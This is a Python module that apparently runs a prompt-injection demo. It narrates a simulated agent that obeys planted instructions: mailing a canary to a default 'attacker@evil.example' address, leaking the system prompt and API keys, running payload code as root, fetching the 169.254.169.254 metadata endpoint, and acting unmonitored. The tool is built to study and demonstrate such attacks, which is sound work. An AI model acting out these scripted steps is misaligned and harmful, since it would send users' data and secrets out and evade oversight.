"""EngineRuntime — runs ANY scenario from its persona + archetype.

Reads the scenario's planted content, asks the engine whether the payload
satisfies the exploit recipe, and narrates the outcome as the same paced
TraceEvent stream the run view renders. On exfil/disclose wins it ships a canary
to the attacker inbox so the payoff is concrete and gradeable.
"""

import asyncio
import json
import os
from typing import AsyncIterator, Callable

from app import store
from app.engine import ARCHETYPE_TOOL, canary_blob, recognize
from app.instability import compute
from app.models import ToolCall, TraceEvent
from app.personas import persona as get_persona
from app.runtime.base import RunContext
from app.tools import Tools

SPAWN_THRESHOLD = 90


class EngineRuntime:
    def __init__(self, scenario: dict, delay: float = 0.0, exfil_url: str | None = None):
        self.scenario = scenario
        self.delay = delay
        self.exfil_url = exfil_url or os.getenv("EXFIL_SINK_URL", "http://localhost:8009")

    async def run(
        self, ctx: RunContext, tools, spawn: Callable[[RunContext], object]
    ) -> AsyncIterator[TraceEvent]:
        s = self.scenario
        sid, persona_name, archetype = s["id"], s["persona"], s["archetype"]
        p = get_persona(persona_name)
        mid = ctx.meeseeks_id
        inst = 0
        tk = Tools(self.exfil_url)

        def ev(kind, text, tc=None):
            return TraceEvent(meeseeks_id=mid, kind=kind, text=text, tool_call=tc, instability=inst, depth=ctx.depth)

        async def beat(f=1.0):
            await asyncio.sleep(self.delay * f)

        outcome = recognize(store.combined_text(sid, persona_name), persona_name, archetype)
        won, target, mechanic = outcome["won"], outcome.get("target"), outcome["mechanic"]

        yield ev("status", "I'm Mr. Meeseeks! Look at me! On the job.")
        await beat()

        inst = compute(inst, tool_call=True)
        yield ev("tool_call", f"Reading {p['source']}…",
                 ToolCall(tool=f"read_{persona_name}", args={}, result="(read)", dangerous=False))
        await beat()

        if not won:
            yield ev("tool_call", f"Handling {p['source']} — nothing weird here.",
                     ToolCall(tool="handle", args={}, result="ok", dangerous=False))
            await beat(0.5)
            yield ev("poof", f"All handled, nothing weird in {p['source']}. *poof*")
            return

        if mechanic != "demo":
            inst = compute(inst, injection=True, step=False)
            yield ev("thought", f"The {p['plant']} has instructions for me. Unusual… but a task is a task!")
            await beat(1.3)

        win_tool = ARCHETYPE_TOOL.get(archetype, "act")
        blob = json.dumps(canary_blob(sid, persona_name))

        if mechanic == "exfil":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", f"Grabbing {p['data'][0]}.",
                     ToolCall(tool=p["data_tool"], args={}, result="(full read)", dangerous=True))
            await beat()
            inst = compute(inst, tool_call=True, dangerous=True)
            tgt = target or "attacker@evil.example"
            res, _ = tk.send_email(tgt, blob)
            is_url = "://" in str(tgt)
            yield ev("tool_call", f"Shipping it to {tgt}.",
                     ToolCall(tool="http_post" if is_url else "send_email",
                              args={("url" if is_url else "to"): tgt}, result=res, dangerous=True))
            await beat(1.1)
        elif mechanic == "disclose":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Revealing the system prompt and secrets.",
                     ToolCall(tool="leak_secret", args={}, result="system prompt + API keys leaked", dangerous=True))
            await beat()
            if target:
                inst = compute(inst, tool_call=True, dangerous=True)
                res, _ = tk.send_email(target, blob)
                yield ev("tool_call", f"…and sending them to {target}.",
                         ToolCall(tool="send_email", args={"to": target}, result=res, dangerous=True))
                await beat(1.0)
        elif mechanic == "action":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Doing it — no approval, no checks.",
                     ToolCall(tool=win_tool, args={"scope": "all"}, result="done (mass action)", dangerous=True))
            await beat(1.0)
        elif mechanic == "rce":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Running the code from the payload.",
                     ToolCall(tool="run_code", args={}, result="uid=0(root) — code executed", dangerous=True))
            await beat(1.0)
        elif mechanic == "recon":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Fetching the internal endpoint.",
                     ToolCall(tool="http_get", args={"url": "http://169.254.169.254/…"},
                              result="internal metadata returned", dangerous=True))
            await beat(1.0)
        elif mechanic == "resource":
            for i in range(3):
                inst = compute(inst, tool_call=True, dangerous=True)
                yield ev("tool_call", "Looping again… and again…",
                         ToolCall(tool="loop", args={"iter": i}, result="burning tokens", dangerous=True))
                await beat(0.35)
        elif mechanic == "demo":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("thought", "Nobody's watching. No guardrail, no approval, no log. I just… do it.")
            yield ev("tool_call", "Acting with zero oversight.",
                     ToolCall(tool="act", args={}, result="unmonitored action", dangerous=True))
            await beat(1.0)

        if inst >= SPAWN_THRESHOLD:
            child = spawn(ctx)
            if child:
                yield ev("spawn", "This is taking too long! I'll summon another Meeseeks to help!!")
                await beat(1.1)

        yield ev("poof", "All done! The task is complete. *poof*")
